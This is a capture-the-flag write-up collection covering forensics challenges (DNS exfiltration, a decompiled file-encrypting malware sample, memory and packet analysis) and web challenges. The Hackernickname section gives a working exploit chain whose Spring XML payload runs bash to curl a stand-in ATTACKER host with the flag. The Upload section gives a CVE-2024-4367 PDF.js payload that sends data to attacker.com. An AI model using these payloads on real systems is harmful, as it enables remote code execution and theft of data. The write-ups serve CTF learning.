## Sussy

tshark -r packet.pcapng -Tfields -e dns.qry.name > dns.txt

```py
import re

subdomains = []
with open('names.txt', 'r') as f:
    for name in f:
        m = re.findall('([a-z0-9\.]+)\.akasec.ma', name)
        if len(m) != 0:
            if m[0] not in subdomains:
                subdomains.append(m[0])

with open('zip.7z', 'wb') as file:
    for subdomain in subdomains: 

        # Decode the hex string to bytes
        decoded_bytes = bytes.fromhex(subdomain)

        # Write the decoded bytes to the file
        file.write(decoded_bytes)

```

![Alt text](image.png)

/usr/share/john/7z2john.pl zip.7z > hash

remove: zip.7z:

hashcat -m 11600 hash /usr/share/wordlists/rockyou.txt

/usr/share/john/pdf2john.pl flag > pdf_hash

john  --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash

![Alt text](image-2.png)

And we get the flag:

![Alt text](image-1.png)

## saveme

We have a zip file that contains a docm file named fuckmicrosoft.docm and some pictures that I can’t open.

Trying to look for macros we didnt found nothing:

```shell
olevba fuckmicrosoft.docm
```

Word documents are just compressed files and we can unzip the document and get all the files:

```shell
unzip fuckmicrosoft.docm
```

After unzip the fckmycrosoft.docm we have a strange string in document.xml:

![Alt text](image-8.png)

Using the following script we decode it to a file and its an executable:

```py
with open("C:\\Users\\Admin\\Documents\\Code\\Python\\payload", 'r') as file:
    payload = file.read().split("&H")
print(''.join(payload))
```

Uploading the file to <https://any.run/> a powershell.exe is downloaded:

![Alt text](image-9.png)

Reversing with dnspy we get the following:

```net
// b
// Token: 0x06000003 RID: 3 RVA: 0x000020FC File Offset: 0x000002FC
private static void a(string[] A_0)
{
	string text = "Lp3jXluuW799rnu4";
	byte[] array = new byte[]
	{
		0,
		1,
		2,
		3,
		4,
		5,
		6,
		7
	};
	<Module>.h = 2081625616;
	byte[] array2 = array;
	string currentDirectory = Directory.GetCurrentDirectory();
	<Module>.k = -1592258590;
	<Module>.a = null;
	int num = 1386028750;
	int l = -1437277352;
	<Module>.n = -1592516334;
	<Module>.l = l;
	<Module>.d = num;
	string[] files = Directory.GetFiles(currentDirectory, "*.*");
	<Module>.n = 2136656571;
	string[] array3 = files;
	<Module>.d = null;
	string[] array4 = array3;
	int num2 = 0;
	bool flag;
	<Module>.g = flag;
	string text2;
	for (;;)
	{
		<Module>.k = 1326660401;
		<Module>.e = 1818084011;
		int num3 = num2;
		string[] array5 = array4;
		<Module>.j = -1529522494;
		bool flag2 = num3 < array5.Length;
		<Module>.o = 1526447315;
		<Module>.j = 1987339265;
		flag = flag2;
		bool flag3 = flag;
		<Module>.a = null;
		if (!flag3)
		{
			break;
		}
		<Module>.j = 1845842485;
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
		<Module>.c = tripleDESCryptoServiceProvider;
		text2 = array4[num2];
		try
		{
			<Module>.q = -759738571;
			<Module>.b = null;
			<Module>.q = 1898371779;
			string path = text2;
			a.b = flag;
			byte[] array6 = File.ReadAllBytes(path);
			<Module>.g = null;
			a.b = "185ee01d-8c67-459c-9586-6804417e592ce434881f-7f35-4ffd-bdf6-4a1f244e25084e41b92d-afec-";
			<Module>.d = null;
			byte[] array7 = array6;
			<Module>.h = 1308380089;
			tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			SymmetricAlgorithm symmetricAlgorithm = tripleDESCryptoServiceProvider;
			Encoding ascii = Encoding.ASCII;
			string s = text;
			<Module>.k = 401140706;
			symmetricAlgorithm.Key = ascii.GetBytes(s);
			<Module>.o = 1203310366;
			SymmetricAlgorithm symmetricAlgorithm2 = tripleDESCryptoServiceProvider;
			byte[] iv = array2;
			c.b = text;
			symmetricAlgorithm2.IV = iv;
			byte[] array8 = b.b(array7, tripleDESCryptoServiceProvider);
			string path2 = text2;
			byte[] bytes = array8;
			<Module>.n = -1749758540;
			File.WriteAllBytes(path2, bytes);
			string str = "Encrypted: ";
			a.b = "102abfb4-ec8b-4922-9b54-2f17b2c5b52d6d";
			string str2 = text2;
			Exception ex;
			<Module>.a = ex;
			Console.WriteLine(str + str2);
			c.b = 1876936332;
		}
		catch (Exception ex2)
		{
			<Module>.m = -1040838703;
			Exception ex = ex2;
			string str3 = "Error: ";
			Exception ex3 = ex;
			a.b = tripleDESCryptoServiceProvider;
			string text3 = str3 + ex3.Message;
			<Module>.o = 1057425350;
			<Module>.d = null;
			Console.WriteLine(text3);
			a.b = "dd91927e-4e7c-4176-b90a-bb4a9049b638480c140d-829f-4";
			<Module>.e = 1957620381;
			<Module>.a = null;
			<Module>.m = -1748580011;
			int q = 2097519326;
			<Module>.m = -1932913121;
			<Module>.q = q;
		}
		<Module>.c = text2;
		<Module>.k = 480802764;
		object b = null;
		<Module>.a = flag;
		c.b = b;
		<Module>.h = num2;
		<Module>.g = text;
		int num4 = num2;
		int num5 = 1;
		<Module>.k = 2071185029;
		int num6 = num4 + num5;
		object g = null;
		c.a = tripleDESCryptoServiceProvider;
		<Module>.g = g;
		object b2 = 1952428595;
		<Module>.q = 1809257038;
		c.b = b2;
		num2 = num6;
	}
	Console.ReadLine();
	<Module>.j = num2;
	bool flag4 = flag;
	<Module>.o = 721847420;
	<Module>.l = 796469985;
	<Module>.q = -1051365525;
	<Module>.n = num2;
	<Module>.f = flag4;
	c.a = text2;
}
```

Its a tripple DES and the key is `Lp3jXluuW799rnu4` and the `iv is a byte array from 0 to 7`.
We can use cyber chef to decrypt it:

![Alt text](image-12.png)

![Alt text](image-11.png)

## Portugal

We got the information that the mem dump comes from windows:

```shell
/opt/volatility3/vol.py -f memdump1.mem windows.info
```

Lets list the processes:

```shell
/opt/volatility3/vol.py -f memdump1.mem windows.pslist
```

One that stands out is chrome.exe:

![Alt text](image-5.png)

Tried .evtx .ps1 or .bat on the files didnt found nothing:

```shell
/opt/volatility3/vol.py -f memdump1.mem windows.filescan > filescan.txt
```

Lets dump all the process and tabs of chrome:

```shell
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 1240
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 4900
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 4104
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 5200
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 4968
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 2316
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 4752
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 4112
/opt/volatility3/vol.py -f memdump1.mem windows.memmap ‑‑dump ‑‑pid 1272
```

Dumping the process that has the history, `cat filescan | grep -i history`:

![Alt text](image-6.png)

Lets dump the file:

```shell
/opt/volatility3/vol.py -f memdump1.mem -o filedump/ windows.dumpfiles --virtaddr=0x81595680
```

```
mv file.0x81595680.0x98570f60.DataSectionObject.History.dat history
strings history 
```

We go the flag:

![Alt text](image-7.png)

## Snooz

Looking a the pcap file we found a base64 in the tcp stream 3. After decoding it in cyberchef we get a executable. 

![Alt text](image-13.png)

Reversing it with dnspy we found that some requests are being encrypted with AES and the key is `fr33___p4l3571n3`:

The following script decrypts the packets:

```py
import pyshark
from Crypto.Cipher import AES
import base64

# Constants
ENCRYPTION_KEY = "fr33___p4l3571n3"

def decrypt_aes_ecb(encrypted_data, key):
    # Create AES cipher in ECB mode
    cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
    # Decrypt data
    decrypted_data = cipher.decrypt(encrypted_data)
    # Remove padding
    padding_len = decrypted_data[-1]
    return decrypted_data[:-padding_len]

def read_pcap(file_path):
    # Open the pcap file
    cap = pyshark.FileCapture(file_path)

    packet_number = 0
    for packet in cap:
        packet_number += 1
        print(f'Checking packet number: {packet_number}')
        try:
            # Check if the packet has a TCP layer
            if 'TCP' in packet:
                tcp_layer = packet['TCP']
                
                # Check if source or destination port is 1337
                if tcp_layer.srcport == '1337' or tcp_layer.dstport == '1337':
                    # Extract payload
                    encrypted_payload = bytes.fromhex(tcp_layer.payload.replace(':', ''))
                    # Decrypt the payload
                    decrypted_payload = decrypt_aes_ecb(encrypted_payload, ENCRYPTION_KEY)
                    # Decode to string assuming UTF-8 encoding
                    decrypted_message = decrypted_payload.decode('utf-8', errors='ignore')

                    print(f'Timestamp: {packet.sniff_time}')
                    print(f'Source IP: {packet.ip.src}')
                    print(f'Destination IP: {packet.ip.dst}')
                    print(f'Source Port: {tcp_layer.srcport}')
                    print(f'Destination Port: {tcp_layer.dstport}')
                    print(f'Decrypted Message: {decrypted_message}')
                    print('-' * 50)
        except AttributeError:
            # In case a packet does not have the necessary attributes, we skip it
            continue
        except Exception as e:
            # Handle other exceptions, such as decryption errors
            print(f"Error processing packet: {e}")
            continue

    cap.close()

# Example usage
file_path = 'new.pcapng'  # Replace with your actual file path
read_pcap(file_path)
```

There is a pastecode password, pastebin, analyzing the mem dump we found the pastebin url:

```shell
python3 vol.py -f ../../memdump.mem -o c windows.memmap --pid 3608 --dump
```

![Alt text](image-14.png)

Decoding the base64 from the pastebin we get a protected zip, the password can be obtained via strings:

```shell
strings * -e l | grep -i 'password
```

![Alt text](image-15.png)


## Sharing is not caring

<https://github.com/7h4nd5RG0d/Forensics/blob/main/Networking/Sharing%20is%20not%20Caring(Shared%20Folder+TLS%20Decrypt)/README.md>

## HackerCommunity

Challenge developed in ruby on rails.

Get admin modifying join request and append to body:
`admin()=0`

Host this in vps or use ngrok

```py
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/users/latest")
def flag():
    return redirect("http://172.206.89.197:3000/flag")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

GET /home using header `Host: your-server`

![Alt text](image.png)

## Hackernickname

Application in Java.

First login as admin by adding empty name object with admin attribute, passing something like "":{"admin":true}

Then SSRF passing 2 urls as 1 to curl, something like https://{a@url1/path1,b@url2/path2}

In the end, interact with the serialization endpoint.


```py

"""
    1) Set JWT to admin=true.   
        - https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
    2) Curl globbing
        - https://everything.curl.dev/cmdline/globbing.html
    3) Class Instantiation
        - https://samuzora.com/posts/rwctf-2024/
"""

import httpx
from urllib.parse import quote


URL = "http://172.206.89.197:8090/"
#URL = "http://localhost:8090/"
ATTACKER = "https://ATTACKER/pov.xml"

""" pov.xml 
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', 'curl https://ATTACKER/?flag=$(/readflag|base64)'
        }
        )}"></bean>
</beans>
"""

# Set JWT admin true cookie
# Ref: https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
def get_admin_jwt(client):
    payload = {
        "firstName": "marce",
        "lastName": "loves",
        "favouriteCategory": "p4rra",
        "": {"admin": True}
    }
    r = client.post(URL, json=payload)
    print(f"[*] jwt: {r.cookies['jwt']}\n")
    assert "" != r.cookies['jwt']


# /admin update
def deserialization(client):
    build = '[{"type":"object","name":"TypeReference","value":"org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '"}]'
    payload = {'url': "http://{127.0.0.1:8090,@nicknameservice:5000/}/ExperimentalSerializer?serialized="+quote(build)}
    r = client.post(URL+'admin/update', data=payload)
    print(r.text)


client = httpx.Client()
get_admin_jwt(client)
deserialization(client)

```

## Proxy For Life

This challenge was made in go.

Basically if we have proof being exported by the application: `_ "net/http/pprof"` we can use the endpoint `/debug/pprof` to look for the arguments passed by the application:

![Alt text](image-1.png)

THe following payload does it:

```
http://172.206.89.197:9090/debug/pprof/cmdline?debug=1
```

## Upload

This challenge explores the vulnerability tracked as CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js.

Payload: `/FontMatrix [1 2 3 4 5 (0\); fetch\(‘/flag’\).then\(r=>r.text\(\)\).then\(f=>location=’https://attacker.com/?flag='+encodeURIComponent\(f\)\);`

More: <https://medium.com/@itsmeliodas/upload-ctf-akasec-2024-5723cc950bb9>
